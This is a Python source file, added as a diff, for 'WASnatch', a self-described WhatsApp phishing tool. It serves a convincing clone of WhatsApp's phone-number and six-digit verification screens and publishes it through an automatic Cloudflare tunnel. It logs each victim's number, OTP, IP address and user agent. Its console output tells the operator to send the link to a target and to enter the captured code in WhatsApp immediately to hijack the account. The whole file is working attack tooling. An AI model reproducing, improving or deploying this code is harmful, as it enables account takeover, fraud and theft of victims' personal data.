@@ -1,0 +1,663 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+WASnatch - WhatsApp login phishing page with automatic Cloudflare tunnel.
+
+Serves a mobile-first clone of the WhatsApp number/OTP login flow, exposes it
+over a public trycloudflare.com HTTPS link, and prints every captured phone
+number and verification code to the terminal in real time.
+
+Works on Windows 10/11 CMD (no WSL), Termux, Kali Linux, and macOS.
+"""
+
+import argparse
+import os
+import re
+import secrets
+import shutil
+import socket
+import subprocess
+import sys
+import threading
+import time
+import urllib.request
+from datetime import datetime
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from urllib.parse import parse_qs
+
+APP = "WASnatch"
+VERSION = "1.0.0"
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+BIN_DIR = os.path.join(BASE_DIR, "bin")
+LOG_FILE = os.path.join(BASE_DIR, "captures.log")
+DEFAULT_REDIRECT = "https://web.whatsapp.com"
+
+# ---------------------------------------------------------------- colors ----
+
+if os.name == "nt":
+    try:
+        import ctypes
+        ctypes.windll.kernel32.SetConsoleMode(
+            ctypes.windll.kernel32.GetStdHandle(-11), 7
+        )
+    except Exception:
+        pass
+
+try:
+    import colorama
+    colorama.init()
+except Exception:
+    pass
+
+G = "\033[92m"
+Y = "\033[93m"
+R = "\033[91m"
+C = "\033[96m"
+D = "\033[90m"
+BOLD = "\033[1m"
+RST = "\033[0m"
+
+if os.environ.get("NO_COLOR"):
+    G = Y = R = C = D = BOLD = RST = ""
+
+LINE = "=" * 62
+
+
+def out(msg=""):
+    sys.stdout.write(str(msg) + "\n")
+    sys.stdout.flush()
+
+
+def banner():
+    out()
+    out(f"{G}{BOLD}")
+    out("   ██╗    ██╗ █████╗ ███████╗███╗   ██╗ █████╗ ████████╗ ██████╗██╗  ██╗")
+    out("   ██║    ██║██╔══██╗██╔════╝████╗  ██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║")
+    out("   ██║ █╗ ██║███████║███████╗██╔██╗ ██║███████║   ██║   ██║     ███████║")
+    out("   ██║███╗██║██╔══██║╚════██║██║╚██╗██║██╔══██║   ██║   ██║     ██╔══██║")
+    out("   ╚███╔███╔╝██║  ██║███████║██║ ╚████║██║  ██║   ██║   ╚██████╗██║  ██║")
+    out("    ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝")
+    out(f"{RST}")
+    out(f"{D}   WhatsApp credential harvester  |  v{VERSION}{RST}")
+    out(f"{D}   Cloudflare tunnel + live terminal capture{RST}")
+    out()
+
+
+# ------------------------------------------------------------------ log ----
+
+_log_lock = threading.Lock()
+
+
+def write_log(kind, phone, code="", ip="", ua=""):
+    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    try:
+        with _log_lock, open(LOG_FILE, "a", encoding="utf-8") as fh:
+            fh.write(f"{ts} | {kind} | {phone} | {code} | {ip} | {ua}\n")
+    except Exception:
+        pass
+
+
+def capture_phone(phone, ip, ua):
+    ts = datetime.now().strftime("%H:%M:%S")
+    sys.stdout.write("\a")
+    out()
+    out(f"{G}{BOLD}{LINE}{RST}")
+    out(f"{G}{BOLD}   [+] PHONE NUMBER CAPTURED{RST}")
+    out(f"{G}{BOLD}{LINE}{RST}")
+    out(f"   {BOLD}NUMBER{RST} : {C}{BOLD}{phone}{RST}")
+    out(f"   {D}IP     : {ip}{RST}")
+    out(f"   {D}AGENT  : {ua[:64]}{RST}")
+    out(f"   {D}TIME   : {ts}{RST}")
+    out(f"{G}{BOLD}{LINE}{RST}")
+    out()
+    write_log("PHONE", phone, "", ip, ua)
+
+
+def capture_code(phone, code, ip, ua):
+    ts = datetime.now().strftime("%H:%M:%S")
+    for _ in range(2):
+        sys.stdout.write("\a")
+        time.sleep(0.08)
+    out()
+    out(f"{Y}{BOLD}{LINE}{RST}")
+    out(f"{Y}{BOLD}   [*] OTP CODE CAPTURED{RST}")
+    out(f"{Y}{BOLD}{LINE}{RST}")
+    out(f"   {BOLD}NUMBER{RST} : {C}{BOLD}{phone}{RST}")
+    out(f"   {BOLD}CODE{RST}   : {Y}{BOLD}{code}{RST}")
+    out(f"   {D}IP     : {ip}{RST}")
+    out(f"   {D}TIME   : {ts}{RST}")
+    out(f"{Y}{BOLD}{LINE}{RST}")
+    out(f"{D}   -> Now open WhatsApp on your device, enter the number,{RST}")
+    out(f"{D}      tap 'Send code' and paste {code} immediately.{RST}")
+    out()
+    write_log("CODE", phone, code, ip, ua)
+
+
+# ------------------------------------------------------------------ css ----
+
+CSS = """
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+html,body{min-height:100%}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+background:#f0f2f5;color:#111b21;display:flex;flex-direction:column;min-height:100vh}
+.bar{background:#00a884;padding:14px 18px;display:flex;align-items:center;gap:10px}
+.bar svg{width:26px;height:26px;fill:#fff;flex:none}
+.bar b{color:#fff;font-size:19px;font-weight:600;letter-spacing:-.2px}
+.bar.slim{padding:13px 14px;gap:4px}
+.back{color:#fff;font-size:23px;text-decoration:none;line-height:1;padding:0 8px 0 0}
+.wrap{flex:1;display:flex;flex-direction:column;align-items:center;padding:22px 16px 26px}
+.card{width:100%;max-width:400px;background:#fff;border-radius:10px;padding:26px 22px 24px;
+box-shadow:0 1px 3px rgba(11,20,26,.13),0 8px 24px rgba(11,20,26,.08)}
+h1{font-size:18.5px;font-weight:600;text-align:center;line-height:1.35;margin-bottom:10px}
+.muted{font-size:13.5px;line-height:1.55;color:#667781;text-align:center;margin-bottom:22px}
+.muted b{color:#111b21;word-break:break-all}
+.field{display:flex;gap:10px;align-items:flex-end}
+select{border:none;border-bottom:1.5px solid #00a884;background:#fff;font-size:15px;color:#111b21;
+padding:9px 2px;outline:none;max-width:94px;appearance:none;-webkit-appearance:none}
+input[type=tel]{flex:1;min-width:0;border:none;border-bottom:1.5px solid #00a884;font-size:16px;
+padding:9px 2px;outline:none;background:transparent;color:#111b21}
+input::placeholder{color:#9aa6ab}
+.code{width:100%;text-align:center;letter-spacing:11px;font-size:24px;font-weight:600;
+border:none;border-bottom:1.5px solid #00a884;padding:12px 0 10px 11px;outline:none;background:transparent}
+button{width:100%;margin-top:24px;padding:12px;border:none;border-radius:7px;background:#00a884;
+color:#fff;font-size:15px;font-weight:600;cursor:pointer}
+button:active{background:#019175}
+button[disabled]{opacity:.65}
+.err{color:#ea4335;font-size:12.5px;text-align:center;margin-top:10px}
+.timer{font-size:12.5px;color:#667781;text-align:center;margin-top:16px}
+.timer b{color:#00a884}
+.foot{margin-top:auto;padding-top:26px;display:flex;align-items:center;justify-content:center;
+gap:6px;font-size:12px;color:#8696a0}
+.foot svg{width:13px;height:13px;fill:#8696a0}
+.check{width:64px;height:64px;border-radius:50%;background:#00a884;display:flex;
+align-items:center;justify-content:center;margin:4px auto 18px}
+.check svg{width:32px;height:32px;fill:#fff}
+.spin{width:32px;height:32px;border:3px solid #d1d7db;border-top-color:#00a884;border-radius:50%;
+margin:6px auto 16px;animation:s .8s linear infinite}
+@keyframes s{to{transform:rotate(360deg)}}
+.small{font-size:11.5px;color:#8696a0;text-align:center;margin-top:16px;line-height:1.5}
+"""
+
+LOGO = ('<svg viewBox="0 0 24 24"><path d="M12.04 2C6.58 2 2.13 6.45 2.13 11.91c0 1.75.46 3.45 1.32 '
+        '4.95L2 22l5.25-1.38a9.87 9.87 0 0 0 4.79 1.22h.01c5.46 0 9.91-4.45 9.91-9.91S17.5 2 '
+        '12.04 2zm5.8 14.02c-.24.68-1.4 1.3-1.93 1.35-.53.05-1.03.24-3.48-.72-2.95-1.16-4.8-4.2'
+        '-4.94-4.4-.14-.2-1.17-1.56-1.17-2.98 0-1.42.75-2.12 1.01-2.41.26-.29.57-.36.76-.36.19 0 '
+        '.38 0 .55.01.18.01.41-.07.64.49.24.58.81 1.98.88 2.12.07.14.12.31.02.5-.1.19-.15.31'
+        '-.29.48-.14.17-.3.38-.43.51-.14.14-.29.29-.12.57.17.29.75 1.24 1.62 2.01 1.11.99 '
+        '2.05 1.3 2.34 1.44.29.14.46.12.63-.07.17-.19.72-.84.91-1.13.19-.29.38-.24.64-.14.26.1 '
+        '1.66.78 1.95.92.29.14.48.22.55.34.07.12.07.7-.17 1.38z"/></svg>')
+
+LOCK = ('<svg viewBox="0 0 24 24"><path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12'
+        'a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm0 2a3 3 0 0 1 3 3v3H9V6a3 3 0 0 1 3-3z"/></svg>')
+
+COUNTRIES = [
+    ("+92", "PK"), ("+91", "IN"), ("+880", "BD"), ("+1", "US"), ("+44", "UK"),
+    ("+971", "AE"), ("+966", "SA"), ("+974", "QA"), ("+965", "KW"), ("+968", "OM"),
+    ("+973", "BH"), ("+90", "TR"), ("+60", "MY"), ("+62", "ID"), ("+63", "PH"),
+    ("+20", "EG"), ("+27", "ZA"), ("+61", "AU"), ("+49", "DE"), ("+33", "FR"),
+]
+
+
+def shell(title, body, js=""):
+    return f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="theme-color" content="#00a884">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<title>{title}</title>
+<style>{CSS}</style>
+</head>
+<body>
+{body}
+{f'<script>{js}</script>' if js else ''}
+</body>
+</html>"""
+
+
+# ---------------------------------------------------------------- pages ----
+
+PHONE_JS = """
+var f=document.getElementById('f'),p=document.getElementById('phone'),
+    e=document.getElementById('err'),b=document.getElementById('btn');
+p.addEventListener('input',function(){p.value=p.value.replace(/[^0-9]/g,'');e.textContent='';});
+f.addEventListener('submit',function(ev){
+  var d=p.value.replace(/\\D/g,'');
+  if(d.length<7){ev.preventDefault();e.textContent='Please enter a valid phone number';p.focus();return;}
+  b.disabled=true;b.textContent='Connecting\\u2026';
+});
+"""
+
+CODE_JS = """
+var f=document.getElementById('f'),c=document.getElementById('code'),sent=false;
+c.addEventListener('input',function(){
+  c.value=c.value.replace(/\\D/g,'');
+  if(c.value.length>=6&&!sent){sent=true;f.requestSubmit();}
+});
+f.addEventListener('submit',function(){
+  if(c.value.replace(/\\D/g,'').length<6){return;}
+  var b=document.getElementById('btn');b.disabled=true;b.textContent='Verifying\\u2026';
+});
+var t=60,el=document.getElementById('timer');
+setInterval(function(){
+  if(t>0){t--;el.innerHTML='Didn\\'t receive the code? <b>Resend in 00:'+
+    String(t).padStart(2,'0')+'</b>';}
+  else{el.innerHTML='<b>Resend code</b>';}
+},1000);
+"""
+
+
+def page_phone(prefill=""):
+    opts = "".join(
+        f'<option value="{c}"{" selected" if c == "+92" else ""}>{c} {n}</option>'
+        for c, n in COUNTRIES
+    )
+    body = f"""
+<div class="bar">{LOGO}<b>WhatsApp</b></div>
+<div class="wrap">
+  <div class="card">
+    <h1>Enter your phone number</h1>
+    <p class="muted">WhatsApp will send a 6-digit verification code to your number.
+    <b>Standard SMS charges may apply.</b></p>
+    <form method="post" action="/submit-phone" id="f" autocomplete="on">
+      <div class="field">
+        <select name="cc" id="cc">{opts}</select>
+        <input type="tel" name="phone" id="phone" placeholder="Phone number"
+               inputmode="numeric" autocomplete="tel-national" autofocus
+               value="{prefill}">
+      </div>
+      <div class="err" id="err"></div>
+      <button type="submit" id="btn">Next</button>
+    </form>
+  </div>
+  <div class="foot">{LOCK}<span>End-to-end encrypted</span></div>
+</div>"""
+    return shell("WhatsApp", body, PHONE_JS)
+
+
+def page_code(phone):
+    body = f"""
+<div class="bar slim"><a class="back" href="/">&larr;</a><b>Verify</b></div>
+<div class="wrap">
+  <div class="card">
+    <h1>Verifying your number</h1>
+    <p class="muted">Enter the 6-digit code we just sent to<br><b>{phone}</b></p>
+    <form method="post" action="/submit-code" id="f">
+      <input type="hidden" name="p" value="{phone}">
+      <input class="code" type="text" name="code" id="code" maxlength="6"
+             inputmode="numeric" autocomplete="one-time-code" placeholder="------" autofocus>
+      <div class="timer" id="timer">Didn't receive the code? <b>Resend in 01:00</b></div>
+      <button type="submit" id="btn">Verify</button>
+    </form>
+  </div>
+  <div class="foot">{LOCK}<span>End-to-end encrypted</span></div>
+</div>"""
+    return shell("Verifying your number", body, CODE_JS)
+
+
+def page_success(redirect):
+    body = f"""
+<div class="bar">{LOGO}<b>WhatsApp</b></div>
+<div class="wrap">
+  <div class="card">
+    <div class="check"><svg viewBox="0 0 24 24"><path d="M9 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4z"/></svg></div>
+    <h1>Number verified</h1>
+    <p class="muted">Your session is being restored.<br>Redirecting to WhatsApp&hellip;</p>
+    <div class="spin"></div>
+    <p class="small">If nothing happens, tap
+    <a href="{redirect}">here</a>.</p>
+  </div>
+  <div class="foot">{LOCK}<span>End-to-end encrypted</span></div>
+</div>"""
+    js = f"setTimeout(function(){{location.replace('{redirect}');}},2300);"
+    return shell("Number verified", body, js)
+
+
+# ------------------------------------------------------------- sessions ----
+
+_sessions = {}
+_sess_lock = threading.Lock()
+
+
+def new_session():
+    sid = secrets.token_urlsafe(16)
+    with _sess_lock:
+        _sessions[sid] = {"phone": "", "ts": time.time()}
+    return sid
+
+
+def get_session(sid):
+    with _sess_lock:
+        return _sessions.get(sid)
+
+
+def set_session_phone(sid, phone):
+    with _sess_lock:
+        _sessions[sid] = {"phone": phone, "ts": time.time()}
+
+
+def mask(phone):
+    if len(phone) <= 7:
+        return phone
+    return phone[:5] + "\u2022" * (len(phone) - 7) + phone[-2:]
+
+
+# -------------------------------------------------------------- handler ----
+
+class App(BaseHTTPRequestHandler):
+    protocol_version = "HTTP/1.1"
+    server_version = "WASnatch"
+    sys_version = ""
+
+    def log_message(self, *args):
+        pass
+
+    # -- helpers ------------------------------------------------------
+    def _send(self, status, body, extra=None):
+        data = body.encode("utf-8", "replace")
+        self.send_response(status)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(data)))
+        self.send_header("Cache-Control", "no-store, max-age=0")
+        self.send_header("X-Content-Type-Options", "nosniff")
+        for key, val in (extra or []):
+            self.send_header(key, val)
+        self.end_headers()
+        try:
+            self.wfile.write(data)
+        except Exception:
+            pass
+
+    def _redirect(self, location, extra=None):
+        self.send_response(302)
+        self.send_header("Location", location)
+        self.send_header("Content-Length", "0")
+        for key, val in (extra or []):
+            self.send_header(key, val)
+        self.end_headers()
+
+    def _form(self):
+        try:
+            length = int(self.headers.get("Content-Length") or 0)
+        except ValueError:
+            length = 0
+        raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""
+        return parse_qs(raw, keep_blank_values=True)
+
+    def _sid(self):
+        cookie = self.headers.get("Cookie") or ""
+        match = re.search(r"sid=([A-Za-z0-9_\-]+)", cookie)
+        return match.group(1) if match else None
+
+    def _ip(self):
+        return (self.headers.get("CF-Connecting-IP")
+                or self.headers.get("X-Forwarded-For", "").split(",")[0].strip()
+                or self.client_address[0])
+
+    # -- routes -------------------------------------------------------
+    def do_GET(self):
+        try:
+            path = self.path.split("?")[0].rstrip("/") or "/"
+            if path == "/":
+                self._send(200, page_phone())
+            elif path == "/favicon.ico":
+                self.send_response(204)
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+            else:
+                self._redirect("/")
+        except Exception:
+            try:
+                self._redirect("/")
+            except Exception:
+                pass
+
+    def do_POST(self):
+        try:
+            path = self.path.split("?")[0].rstrip("/") or "/"
+            form = self._form()
+
+            if path == "/submit-phone":
+                cc = (form.get("cc", ["+92"])[0] or "+92").strip()
+                digits = re.sub(r"\D", "", form.get("phone", [""])[0])
+                if len(digits) < 7:
+                    self._send(200, page_phone(digits))
+                    return
+                if digits.startswith("0"):
+                    digits = digits.lstrip("0") or digits
+                phone = f"{cc} {digits}"
+                sid = new_session()
+                set_session_phone(sid, phone)
+                capture_phone(phone, self._ip(), self.headers.get("User-Agent", "-"))
+                self._send(
+                    200,
+                    page_code(mask(phone)),
+                    [("Set-Cookie", f"sid={sid}; Path=/; SameSite=Lax")],
+                )
+
+            elif path == "/submit-code":
+                sid = self._sid()
+                phone = (get_session(sid) or {}).get("phone") if sid else ""
+                if not phone:
+                    phone = form.get("p", [""])[0] or "unknown"
+                code = re.sub(r"\D", "", form.get("code", [""])[0])
+                capture_code(phone, code or "-", self._ip(),
+                             self.headers.get("User-Agent", "-"))
+                self._send(200, page_success(REDIRECT))
+
+            else:
+                self._redirect("/")
+        except Exception:
+            try:
+                self._redirect("/")
+            except Exception:
+                pass
+
+
+# ------------------------------------------------------------ cloudflared ----
+
+ASSETS = {
+    ("Windows", "AMD64"): "cloudflared-windows-amd64.exe",
+    ("Windows", "x86"): "cloudflared-windows-386.exe",
+    ("Linux", "x86_64"): "cloudflared-linux-amd64",
+    ("Linux", "aarch64"): "cloudflared-linux-arm64",
+    ("Linux", "armv7l"): "cloudflared-linux-arm",
+    ("Linux", "armv6l"): "cloudflared-linux-arm",
+    ("Darwin", "x86_64"): "cloudflared-darwin-amd64.tgz",
+    ("Darwin", "arm64"): "cloudflared-darwin-arm64.tgz",
+}
+
+BASE_URL = "https://github.com/cloudflare/cloudflared/releases/latest/download/"
+
+
+def find_cloudflared():
+    override = os.environ.get("CLOUDFLARED")
+    if override and os.path.isfile(override):
+        return override
+    local = os.path.join(BIN_DIR, "cloudflared.exe" if os.name == "nt" else "cloudflared")
+    if os.path.isfile(local):
+        return local
+    return shutil.which("cloudflared")
+
+
+def download_cloudflared():
+    import platform
+    system = platform.system()
+    machine = platform.machine()
+    asset = ASSETS.get((system, machine))
+    if not asset:
+        return None
+
+    os.makedirs(BIN_DIR, exist_ok=True)
+    target = os.path.join(BIN_DIR, asset)
+    url = BASE_URL + asset
+    out(f"{D}[*] Downloading cloudflared for {system}/{machine}...{RST}")
+    try:
+        with urllib.request.urlopen(url, timeout=90) as resp, open(target, "wb") as fh:
+            shutil.copyfileobj(resp, fh)
+    except Exception as exc:
+        out(f"{R}[!] Download failed: {exc}{RST}")
+        return None
+
+    if asset.endswith(".tgz"):
+        import tarfile
+        with tarfile.open(target) as tar:
+            tar.extractall(BIN_DIR)
+        os.remove(target)
+        target = os.path.join(BIN_DIR, "cloudflared")
+
+    if os.name != "nt":
+        try:
+            os.chmod(target, 0o755)
+        except Exception:
+            pass
+
+    out(f"{G}[+] cloudflared ready{RST}")
+    return target
+
+
+def ensure_cloudflared():
+    found = find_cloudflared()
+    if found:
+        return found
+    return download_cloudflared()
+
+
+def start_tunnel(port):
+    binary = ensure_cloudflared()
+    if not binary:
+        return None, None
+
+    cmd = [binary, "tunnel", "--url", f"http://127.0.0.1:{port}",
+           "--no-autoupdate", "--loglevel", "info"]
+    flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
+
+    try:
+        proc = subprocess.Popen(
+            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            text=True, bufsize=1, creationflags=flags,
+        )
+    except Exception as exc:
+        out(f"{R}[!] Could not start cloudflared: {exc}{RST}")
+        return None, None
+
+    holder = {}
+    ready = threading.Event()
+
+    def reader():
+        try:
+            for line in proc.stdout:
+                match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
+                if match and not ready.is_set():
+                    holder["url"] = match.group(0)
+                    ready.set()
+        except Exception:
+            pass
+
+    threading.Thread(target=reader, daemon=True).start()
+    ready.wait(60)
+    return proc, holder.get("url")
+
+
+# ----------------------------------------------------------------- main ----
+
+REDIRECT = DEFAULT_REDIRECT
+
+
+def free_port(start):
+    for candidate in range(start, start + 50):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            try:
+                sock.bind(("0.0.0.0", candidate))
+                return candidate
+            except OSError:
+                continue
+    return start
+
+
+def lan_ip():
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+            sock.connect(("8.8.8.8", 80))
+            return sock.getsockname()[0]
+    except Exception:
+        return "127.0.0.1"
+
+
+def main():
+    global REDIRECT
+
+    parser = argparse.ArgumentParser(
+        prog="main.py",
+        description="WASnatch - WhatsApp login phishing page with Cloudflare tunnel",
+    )
+    parser.add_argument("-p", "--port", type=int, default=8080, help="local port")
+    parser.add_argument("--no-tunnel", action="store_true", help="LAN only, skip cloudflared")
+    parser.add_argument("--redirect", default=DEFAULT_REDIRECT, help="post-capture redirect URL")
+    args = parser.parse_args()
+
+    REDIRECT = args.redirect
+    banner()
+
+    port = free_port(args.port)
+    try:
+        server = ThreadingHTTPServer(("0.0.0.0", port), App)
+        server.daemon_threads = True
+    except Exception as exc:
+        out(f"{R}[!] Cannot bind port {port}: {exc}{RST}")
+        sys.exit(1)
+
+    threading.Thread(target=server.serve_forever, daemon=True).start()
+    out(f"{G}[+] Local server listening on 0.0.0.0:{port}{RST}")
+
+    tunnel = None
+    public = None
+    if not args.no_tunnel:
+        out(f"{D}[*] Opening Cloudflare tunnel...{RST}")
+        tunnel, public = start_tunnel(port)
+
+    if public:
+        out()
+        out(f"{G}{BOLD}{LINE}{RST}")
+        out(f"{G}{BOLD}   SEND THIS LINK TO THE TARGET{RST}")
+        out(f"{G}{BOLD}{LINE}{RST}")
+        out(f"   {C}{BOLD}{public}{RST}")
+        out(f"{G}{BOLD}{LINE}{RST}")
+        out()
+        out(f"{D}   Link is HTTPS and mobile friendly. Keep this window open.{RST}")
+    elif args.no_tunnel:
+        out()
+        out(f"{Y}[!] Tunnel disabled. LAN URL:{RST} {C}http://{lan_ip()}:{port}{RST}")
+    else:
+        out()
+        out(f"{R}[!] Tunnel failed. LAN fallback:{RST} {C}http://{lan_ip()}:{port}{RST}")
+        out(f"{D}   Install cloudflared manually and rerun, or use --no-tunnel.{RST}")
+
+    out()
+    out(f"{D}   Captures are written to {LOG_FILE}{RST}")
+    out(f"{D}   Press Ctrl+C to stop.{RST}")
+    out()
+    out(f"{Y}[*] Waiting for victim...{RST}")
+
+    try:
+        while True:
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        out()
+        out(f"{Y}[*] Shutting down...{RST}")
+    finally:
+        try:
+            server.shutdown()
+        except Exception:
+            pass
+        if tunnel:
+            try:
+                tunnel.terminate()
+            except Exception:
+                pass
+
+
+if __name__ == "__main__":
+    main()
